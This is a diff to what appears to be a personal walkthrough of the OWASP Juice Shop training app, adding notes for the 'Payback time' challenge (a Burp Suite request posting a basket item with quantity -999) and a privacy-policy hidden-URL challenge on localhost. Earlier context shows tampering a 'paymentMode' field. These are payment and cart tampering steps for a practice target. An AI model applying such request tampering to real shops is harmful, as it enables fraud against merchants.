@@ -196,10 +196,19 @@ remove disabled="true",mat-button-disabled<br>
 burp suite > proxy > repeater <br> 
 "paymentMode":"paid" <br>
 
+### Payback time
+Add to basket <br>
+burp suite > proxy<br>
+POST /api/BasketItems/ HTTP/1.1<br>
+"ProductId":41,"BasketId":"1","quantity":-999<br>
+check out<br>
 
-
-
-
+### Privacy Policy Inspection 
+firefox > highlighted glowing text > inspect 
+span class="hot"
+search .hot
+http://localhost we may also instruct you to refuse all reasonably necessary responsibility
+http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility
 
 
 
